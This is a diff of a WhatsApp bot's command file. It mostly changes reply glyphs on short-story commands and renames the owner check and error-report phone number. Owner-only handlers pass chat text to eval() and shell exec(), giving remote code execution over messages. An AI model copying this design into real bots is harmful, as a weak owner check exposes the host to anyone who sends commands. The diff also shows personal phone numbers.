+reply(`⭔ _*Title :*_ ${qpeidek.title}\n⭔ _*Author :*_ ${qpeidek.author}\n⭔ _*Category :*_ ${qpeidek.kategori}\n⭔ _*Pass Moderation :*_ ${qpeidek.lolos}\n⭔ _*Story :*_\n${qpeidek.cerita}`)
 }
 break
 case 'cerpen_nasionalisme':{
 if (!isPrem) return replyprem(mess.premium)
 let cdmrgo = await cerpen(`nasionalisme`)
-reply(`? _*Title :*_ ${cdmrgo.title}\n? _*Author :*_ ${cdmrgo.author}\n? _*Category :*_ ${cdmrgo.kategori}\n? _*Pass Moderation :*_ ${cdmrgo.lolos}\n? _*Story :*_\n${cdmrgo.cerita}`)
+reply(`⭔ _*Title :*_ ${cdmrgo.title}\n⭔ _*Author :*_ ${cdmrgo.author}\n⭔ _*Category :*_ ${cdmrgo.kategori}\n⭔ _*Pass Moderation :*_ ${cdmrgo.lolos}\n⭔ _*Story :*_\n${cdmrgo.cerita}`)
 }
 break
 case 'cerpen_olahraga':{
 if (!isPrem) return replyprem(mess.premium)
 let qpdiek = await cerpen(`olahraga`)
-reply(`? _*Title :*_ ${qpdiek.title}\n? _*Author :*_ ${qpdiek.author}\n? _*Category :*_ ${qpdiek.kategori}\n? _*Pass Moderation :*_ ${qpdiek.lolos}\n? _*Story :*_\n${qpdiek.cerita}`)
+reply(`⭔ _*Title :*_ ${qpdiek.title}\n⭔ _*Author :*_ ${qpdiek.author}\n⭔ _*Category :*_ ${qpdiek.kategori}\n⭔ _*Pass Moderation :*_ ${qpdiek.lolos}\n⭔ _*Story :*_\n${qpdiek.cerita}`)
 }
 break
 case 'cerpen_patahhati':{
 if (!isPrem) return replyprem(mess.premium)
 let vrlfor = await cerpen(`patah hati`)
-reply(`? _*Title :*_ ${vrlfor.title}\n? _*Author :*_ ${vrlfor.author}\n? _*Category :*_ ${vrlfor.kategori}\n? _*Pass Moderation :*_ ${vrlfor.lolos}\n? _*Story :*_\n${vrlfor.cerita}`)
+reply(`⭔ _*Title :*_ ${vrlfor.title}\n⭔ _*Author :*_ ${vrlfor.author}\n⭔ _*Category :*_ ${vrlfor.kategori}\n⭔ _*Pass Moderation :*_ ${vrlfor.lolos}\n⭔ _*Story :*_\n${vrlfor.cerita}`)
 }
 break
 case 'cerpen_penantian':{
 if (!isPrem) return replyprem(mess.premium)
 let aldpek = await cerpen(`penantian`)
-reply(`? _*Title :*_ ${aldpek.title}\n? _*Author :*_ ${aldpek.author}\n? _*Category :*_ ${aldpek.kategori}\n? _*Pass Moderation :*_ ${aldpek.lolos}\n? _*Story :*_\n${aldpek.cerita}`)
+reply(`⭔ _*Title :*_ ${aldpek.title}\n⭔ _*Author :*_ ${aldpek.author}\n⭔ _*Category :*_ ${aldpek.kategori}\n⭔ _*Pass Moderation :*_ ${aldpek.lolos}\n⭔ _*Story :*_\n${aldpek.cerita}`)
 }
 break
 case 'cerpen_pendidikan':{
 if (!isPrem) return replyprem(mess.premium)
 let xnrjrk = await cerpen(`pendidikan`)
-reply(`? _*Title :*_ ${xnrjrk.title}\n? _*Author :*_ ${xnrjrk.author}\n? _*Category :*_ ${xnrjrk.kategori}\n? _*Pass Moderation :*_ ${xnrjrk.lolos}\n? _*Story :*_\n${xnrjrk.cerita}`)
+reply(`⭔ _*Title :*_ ${xnrjrk.title}\n⭔ _*Author :*_ ${xnrjrk.author}\n⭔ _*Category :*_ ${xnrjrk.kategori}\n⭔ _*Pass Moderation :*_ ${xnrjrk.lolos}\n⭔ _*Story :*_\n${xnrjrk.cerita}`)
 }
 break
 case 'cerpen_pengalaman':{
 if (!isPrem) return replyprem(mess.premium)
 let hrkgor = await cerpen(`pengalaman pribadi`)
-reply(`? _*Title :*_ ${hrkgor.title}\n? _*Author :*_ ${hrkgor.author}\n? _*Category :*_ ${hrkgor.kategori}\n? _*Pass Moderation :*_ ${hrkgor.lolos}\n? _*Story :*_\n${hrkgor.cerita}`)
+reply(`⭔ _*Title :*_ ${hrkgor.title}\n⭔ _*Author :*_ ${hrkgor.author}\n⭔ _*Category :*_ ${hrkgor.kategori}\n⭔ _*Pass Moderation :*_ ${hrkgor.lolos}\n⭔ _*Story :*_\n${hrkgor.cerita}`)
 }
 break
 case 'cerpen_pengorbanan':{
 if (!isPrem) return replyprem(mess.premium)
 let itklog = await cerpen(`pengorbanan`)
-reply(`? _*Title :*_ ${itklog.title}\n? _*Author :*_ ${itklog.author}\n? _*Category :*_ ${itklog.kategori}\n? _*Pass Moderation :*_ ${itklog.lolos}\n? _*Story :*_\n${itklog.cerita}`)
+reply(`⭔ _*Title :*_ ${itklog.title}\n⭔ _*Author :*_ ${itklog.author}\n⭔ _*Category :*_ ${itklog.kategori}\n⭔ _*Pass Moderation :*_ ${itklog.lolos}\n⭔ _*Story :*_\n${itklog.cerita}`)
 }
 break
 case 'cerpen_penyesalan':{
 if (!isPrem) return replyprem(mess.premium)
 let pgrjgo = await cerpen(`penyesalan`)
-reply(`? _*Title :*_ ${pgrjgo.title}\n? _*Author :*_ ${pgrjgo.author}\n? _*Category :*_ ${pgrjgo.kategori}\n? _*Pass Moderation :*_ ${pgrjgo.lolos}\n? _*Story :*_\n${pgrjgo.cerita}`)
+reply(`⭔ _*Title :*_ ${pgrjgo.title}\n⭔ _*Author :*_ ${pgrjgo.author}\n⭔ _*Category :*_ ${pgrjgo.kategori}\n⭔ _*Pass Moderation :*_ ${pgrjgo.lolos}\n⭔ _*Story :*_\n${pgrjgo.cerita}`)
 }
 break
 case 'cerpen_perjuangan':{
 if (!isPrem) return replyprem(mess.premium)
 let vtlgotk = await cerpen(`perjuangan`)
-reply(`? _*Title :*_ ${vtlgotk.title}\n? _*Author :*_ ${vtlgotk.author}\n? _*Category :*_ ${vtlgotk.kategori}\n? _*Pass Moderation :*_ ${vtlgotk.lolos}\n? _*Story :*_\n${vtlgotk.cerita}`)
+reply(`⭔ _*Title :*_ ${vtlgotk.title}\n⭔ _*Author :*_ ${vtlgotk.author}\n⭔ _*Category :*_ ${vtlgotk.kategori}\n⭔ _*Pass Moderation :*_ ${vtlgotk.lolos}\n⭔ _*Story :*_\n${vtlgotk.cerita}`)
 }
 break
 case 'cerpen_perpisahan':{
 if (!isPrem) return replyprem(mess.premium)
 let wpfuej = await cerpen(`perpisahan`)
-reply(`? _*Title :*_ ${wpfuej.title}\n? _*Author :*_ ${wpfuej.author}\n? _*Category :*_ ${wpfuej.kategori}\n? _*Pass Moderation :*_ ${wpfuej.lolos}\n? _*Story :*_\n${wpfuej.cerita}`)
+reply(`⭔ _*Title :*_ ${wpfuej.title}\n⭔ _*Author :*_ ${wpfuej.author}\n⭔ _*Category :*_ ${wpfuej.kategori}\n⭔ _*Pass Moderation :*_ ${wpfuej.lolos}\n⭔ _*Story :*_\n${wpfuej.cerita}`)
 }
 break
 case 'cerpen_persahabatan':{
 if (!isPrem) return replyprem(mess.premium)
 let jptoyk = await cerpen(`persahabatan`)
-reply(`? _*Title :*_ ${jptoyk.title}\n? _*Author :*_ ${jptoyk.author}\n? _*Category :*_ ${jptoyk.kategori}\n? _*Pass Moderation :*_ ${jptoyk.lolos}\n? _*Story :*_\n${jptoyk.cerita}`)
+reply(`⭔ _*Title :*_ ${jptoyk.title}\n⭔ _*Author :*_ ${jptoyk.author}\n⭔ _*Category :*_ ${jptoyk.kategori}\n⭔ _*Pass Moderation :*_ ${jptoyk.lolos}\n⭔ _*Story :*_\n${jptoyk.cerita}`)
 }
 break
 case 'cerpen_petualangan':{
 if (!isPrem) return replyprem(mess.premium)
 let qwers = await cerpen(`petualangan`)
-reply(`? _*Title :*_ ${qwers.title}\n? _*Author :*_ ${qwers.author}\n? _*Category :*_ ${qwers.kategori}\n? _*Pass Moderation :*_ ${qwers.lolos}\n? _*Story :*_\n${qwers.cerita}`)
+reply(`⭔ _*Title :*_ ${qwers.title}\n⭔ _*Author :*_ ${qwers.author}\n⭔ _*Category :*_ ${qwers.kategori}\n⭔ _*Pass Moderation :*_ ${qwers.lolos}\n⭔ _*Story :*_\n${qwers.cerita}`)
 }
 break
 case 'cerpen_ramadhan':{
 if (!isPrem) return replyprem(mess.premium)
 let vrmfkk = await cerpen(`ramadhan`)
-reply(`? _*Title :*_ ${vrmfkk.title}\n? _*Author :*_ ${vrmfkk.author}\n? _*Category :*_ ${vrmfkk.kategori}\n? _*Pass Moderation :*_ ${vrmfkk.lolos}\n? _*Story :*_\n${vrmfkk.cerita}`)
+reply(`⭔ _*Title :*_ ${vrmfkk.title}\n⭔ _*Author :*_ ${vrmfkk.author}\n⭔ _*Category :*_ ${vrmfkk.kategori}\n⭔ _*Pass Moderation :*_ ${vrmfkk.lolos}\n⭔ _*Story :*_\n${vrmfkk.cerita}`)
 }
 break
 case 'cerpen_remaja':{
 if (!isPrem) return replyprem(mess.premium)
 let vhptotk = await cerpen(`remaja`)
-reply(`? _*Title :*_ ${vhptotk.title}\n? _*Author :*_ ${vhptotk.author}\n? _*Category :*_ ${vhptotk.kategori}\n? _*Pass Moderation :*_ ${vhptotk.lolos}\n? _*Story :*_\n${vhptotk.cerita}`)
+reply(`⭔ _*Title :*_ ${vhptotk.title}\n⭔ _*Author :*_ ${vhptotk.author}\n⭔ _*Category :*_ ${vhptotk.kategori}\n⭔ _*Pass Moderation :*_ ${vhptotk.lolos}\n⭔ _*Story :*_\n${vhptotk.cerita}`)
 }
 break
 case 'cerpen_rindu':{
 if (!isPrem) return replyprem(mess.premium)
 let hptotlltk = await cerpen(`rindu`)
-reply(`? _*Title :*_ ${hptotlltk.title}\n? _*Author :*_ ${hptotlltk.author}\n? _*Category :*_ ${hptotlltk.kategori}\n? _*Pass Moderation :*_ ${hptotlltk.lolos}\n? _*Story :*_\n${hptotlltk.cerita}`)
+reply(`⭔ _*Title :*_ ${hptotlltk.title}\n⭔ _*Author :*_ ${hptotlltk.author}\n⭔ _*Category :*_ ${hptotlltk.kategori}\n⭔ _*Pass Moderation :*_ ${hptotlltk.lolos}\n⭔ _*Story :*_\n${hptotlltk.cerita}`)
 }
 break
 case 'cerpen_rohani':{
 if (!isPrem) return replyprem(mess.premium)
 let zaldjdws = await cerpen(`rohani`)
-reply(`? _*Title :*_ ${zaldjdws.title}\n? _*Author :*_ ${zaldjdws.author}\n? _*Category :*_ ${zaldjdws.kategori}\n? _*Pass Moderation :*_ ${zaldjdws.lolos}\n? _*Story :*_\n${zaldjdws.cerita}`)
+reply(`⭔ _*Title :*_ ${zaldjdws.title}\n⭔ _*Author :*_ ${zaldjdws.author}\n⭔ _*Category :*_ ${zaldjdws.kategori}\n⭔ _*Pass Moderation :*_ ${zaldjdws.lolos}\n⭔ _*Story :*_\n${zaldjdws.cerita}`)
 }
 break
 case 'cerpen_romantis':{
 if (!isPrem) return replyprem(mess.premium)
 let lxprhrh = await cerpen(`romantis`)
-reply(`? _*Title :*_ ${lxprhrh.title}\n? _*Author :*_ ${lxprhrh.author}\n? _*Category :*_ ${lxprhrh.kategori}\n? _*Pass Moderation :*_ ${lxprhrh.lolos}\n? _*Story :*_\n${lxprhrh.cerita}`)
+reply(`⭔ _*Title :*_ ${lxprhrh.title}\n⭔ _*Author :*_ ${lxprhrh.author}\n⭔ _*Category :*_ ${lxprhrh.kategori}\n⭔ _*Pass Moderation :*_ ${lxprhrh.lolos}\n⭔ _*Story :*_\n${lxprhrh.cerita}`)
 }
 break
 case 'cerpen_sastra':{
 if (!isPrem) return replyprem(mess.premium)
 let qpifker = await cerpen(`sastra`)
-reply(`? _*Title :*_ ${qpifker.title}\n? _*Author :*_ ${qpifker.author}\n? _*Category :*_ ${qpifker.kategori}\n? _*Pass Moderation :*_ ${qpifker.lolos}\n? _*Story :*_\n${qpifker.cerita}`)
+reply(`⭔ _*Title :*_ ${qpifker.title}\n⭔ _*Author :*_ ${qpifker.author}\n⭔ _*Category :*_ ${qpifker.kategori}\n⭔ _*Pass Moderation :*_ ${qpifker.lolos}\n⭔ _*Story :*_\n${qpifker.cerita}`)
 }
 break
 case 'cerpen_sedih':{
 if (!isPrem) return replyprem(mess.premium)
 let bmflgkjt = await cerpen(`sedih`)
-reply(`? _*Title :*_ ${bmflgkjt.title}\n? _*Author :*_ ${bmflgkjt.author}\n? _*Category :*_ ${bmflgkjt.kategori}\n? _*Pass Moderation :*_ ${bmflgkjt.lolos}\n? _*Story :*_\n${bmflgkjt.cerita}`)
+reply(`⭔ _*Title :*_ ${bmflgkjt.title}\n⭔ _*Author :*_ ${bmflgkjt.author}\n⭔ _*Category :*_ ${bmflgkjt.kategori}\n⭔ _*Pass Moderation :*_ ${bmflgkjt.lolos}\n⭔ _*Story :*_\n${bmflgkjt.cerita}`)
 }
 break
 case 'cerpen_sejarah':{
 if (!isPrem) return replyprem(mess.premium)
 let xwpwifj = await cerpen(`sejarah`)
-reply(`? _*Title :*_ ${xwpwifj.title}\n? _*Author :*_ ${xwpwifj.author}\n? _*Category :*_ ${xwpwifj.kategori}\n? _*Pass Moderation :*_ ${xwpwifj.lolos}\n? _*Story :*_\n${xwpwifj.cerita}`)
+reply(`⭔ _*Title :*_ ${xwpwifj.title}\n⭔ _*Author :*_ ${xwpwifj.author}\n⭔ _*Category :*_ ${xwpwifj.kategori}\n⭔ _*Pass Moderation :*_ ${xwpwifj.lolos}\n⭔ _*Story :*_\n${xwpwifj.cerita}`)
 }
 break
 case '>':
 case '=>':
-if (!itsByMax) return;
+if (!itsMeKayla) return;
 var err = new TypeError;
 err.name = "EvalError "
 err.message = "Code Not Found (404)"
@@ -3811,7 +3811,7 @@ reply(util.format(_syntax + _err))
 break
 default:
 if (budy.startsWith('<')) {
-if (!itsByMax) return
+if (!itsMeKayla) return
 try {
 return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
 } catch (e) {
@@ -3820,7 +3820,7 @@ reply(e)
 }
 
 if (budy.startsWith('vv')) {
-if (!itsByMax) return
+if (!itsMeKayla) return
 try {
 let evaled = await eval(budy.slice(2))
 if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
@@ -3831,7 +3831,7 @@ reply(String(err))
 }
 
 if (budy.startsWith('uu')){
-if (!itsByMax) return
+if (!itsMeKayla) return
 qur = budy.slice(2)
 exec(qur, (err, stdout) => {
 if (err) return reply(`${err}`)
@@ -3861,14 +3861,14 @@ if (m.chat.endsWith('broadcast')) return
 if (m.isBaileys) return
 let msgs = global.db.database
 if (!(budy.toLowerCase() in msgs)) return
-BayMax.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
+baymax.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
 }
 }
 
 } catch (err) {
 console.log(util.format(err))
 let e = String(err)
-BayMax.sendMessage("6281390368580@s.whatsapp.net", { text: "Hallo Owner Sepertinya Ada Yang Error Harap Di Perbaiki " + util.format(e), 
+baymax.sendMessage("6287705048235@s.whatsapp.net", { text: "Hallo Owner Sepertinya Ada Yang Error Harap Di Perbaiki " + util.format(e), 
 contextInfo:{
 forwardingScore: 5, 
 isForwarded: true
